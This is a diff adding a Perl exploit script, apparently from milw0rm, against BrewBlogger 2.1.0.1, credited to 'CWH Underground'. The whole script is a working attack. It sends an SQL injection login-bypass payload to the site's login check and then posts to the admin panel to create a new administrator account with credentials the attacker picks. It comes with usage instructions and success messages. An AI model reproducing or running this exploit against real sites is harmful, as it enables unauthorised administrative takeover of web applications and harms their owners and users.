@@ -1,0 +1,128 @@
+#!/usr/bin/perl
+#=================================================
+# BrewBlogger 2.1.0.1 Arbitrary Add Admin Exploit
+#=================================================
+#
+#  ,--^----------,--------,-----,-------^--,
+#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+#  `+---------------------------^----------|
+#    `\_,-------, _________________________|
+#      / XXXXXX /`|     /
+#     / XXXXXX /  `\   /
+#    / XXXXXX /\______(
+#   / XXXXXX /           
+#  / XXXXXX /
+# (________(             
+#  `------'
+#
+#AUTHOR : CWH Underground
+#DATE : 8 July 2008
+#SITE : www.citec.us
+#
+#
+#####################################################
+#APPLICATION : BrewBlogger
+#VERSION : 2.1.0.1
+#DOWNLOAD : http://downloads.sourceforge.net/brewblogger/BB2.1.0.1.zip?modtime=1196093070&big_mirror=0
+######################################################
+#
+#Note: magic_quotes_gpc = off
+#
+#This Exploit will Add user to Administrator's Privilege.
+#
+#####################################################################
+# Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos   
+# Special Thx : asylu3, str0ke, CITEC, milw0rm
+#####################################################################
+
+use LWP;
+use HTTP::Request;
+use HTTP::Cookies;
+
+print "\n==================================================\n";
+print " BrewBlogger 2.1.0.1 Arbitrary Add Admin Exploit \n";
+print " \n";
+print "         Discovered By CWH Underground \n";
+print "==================================================\n";
+print "                                              \n";
+print "  ,--^----------,--------,-----,-------^--,   \n";
+print "  | |||||||||   `--------'     |          O	\n";
+print "  `+---------------------------^----------|   \n";
+print "    `\_,-------, _________________________|   \n";
+print "      / XXXXXX /`|     /                      \n";
+print "     / XXXXXX /  `\   /                       \n";
+print "    / XXXXXX /\______(                        \n";
+print "   / XXXXXX /                                 \n";
+print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+print " (________(                                   \n";
+print "  `------'                                    \n";
+print "                                              \n";
+
+if ($#ARGV + 1 != 3)
+{
+   print "Usage: ./xpl-brewblogger.pl <BrewBlogger URL> <user> <pass>\n";
+   print "Ex. ./xpl-brewblogger.pl http://www.target.com/BrewBlogger/ cwhuser cwhpass\n";
+   exit();
+}
+
+$blogurl = $ARGV[0];
+$user = $ARGV[1];
+$pass = $ARGV[2];
+
+
+$loginurl = $blogurl."includes/logincheck.inc.php";
+$adduserurl = $blogurl."admin/process.php?action=add&dbTable=users";
+$post_content = "x=38&y=15&realFirstName=FirstName&realLastName=LastName&userLevel=1&user_name=".$user."&password=".$pass;
+
+print "\n..::Login Page URL::..\n";
+print "$loginurl";
+print "\n..::Add User Page URL::..\n";
+print "$adduserurl\n\n";
+print "..::Login Process::..\n";
+
+$ua = LWP::UserAgent->new;
+$ua->cookie_jar(HTTP::Cookies->new);
+
+$request = HTTP::Request->new (POST => $loginurl);
+$request->header (Accept-Charset => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
+$request->content_type ('application/x-www-form-urlencoded');
+$request->content ('loginUsername=\'+or+id=1/*&loginPassword=&x=0&y=0'); 
+
+$response = $ua->request($request);
+$location = $response -> header('Location');
+print "Result :: ";
+
+if ($location =~ /..\/admin\/index.php/)
+{
+   print "Login Success!!!\n";
+}
+else
+{
+   print "Login Failed T T\n";
+   exit();
+}
+
+print "\n..::Add Admin Process::..\n";
+$request = HTTP::Request->new (POST => $adduserurl);
+$request->content_type ('application/x-www-form-urlencoded');
+$request->content ($post_content);
+$response = $ua->request($request);
+
+$location = "";
+$location = $response->header('Location');
+print "Result :: ";
+
+if ($location =~ /index.php\?action=list&dbTable=users&confirm=true&msg=1/)
+{
+   print "Exploit Success!!!\n\n";
+   print "Username :: ".$user."\n";
+   print "Password :: ".$pass."\n";
+   print "Role     :: Administrator\n";
+}
+else
+{
+   print "Exploit Failed T T\n";
+   exit();
+}
+
+# milw0rm.com [2008-07-08]
